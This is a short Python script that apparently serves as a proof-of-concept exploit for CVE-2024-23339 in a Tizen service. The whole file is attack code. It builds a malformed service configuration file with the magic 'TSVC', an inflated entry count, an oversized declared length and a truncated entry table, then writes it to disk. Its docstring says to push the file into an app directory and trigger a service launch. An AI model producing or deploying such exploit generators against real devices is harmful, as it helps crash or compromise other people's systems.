#!/usr/bin/env python3
"""CVE-2024-23339 — Tizen Service. Malformed service config descriptor.
Push to /opt/usr/apps/<app>/ and trigger service launch."""
import struct, sys
from pathlib import Path

def build() -> bytes:
    # [magic][ver:u16][entries:u16][declared_len:u32] + truncated entry table
    return (b"TSVC" + struct.pack("<HHI", 2, 0xFFFF, 0x1000)
            + b"".join(struct.pack("<HH", i, 0xFFFF) for i in range(4)))

def main():
    out = Path(sys.argv[1] if len(sys.argv) > 1 else "cve-2024-23339.tsvc")
    d = build(); out.write_bytes(d)
    print(f"[+] CVE-2024-23339 Tizen service config -> {out} ({len(d)} bytes)")

if __name__ == "__main__":
    main()
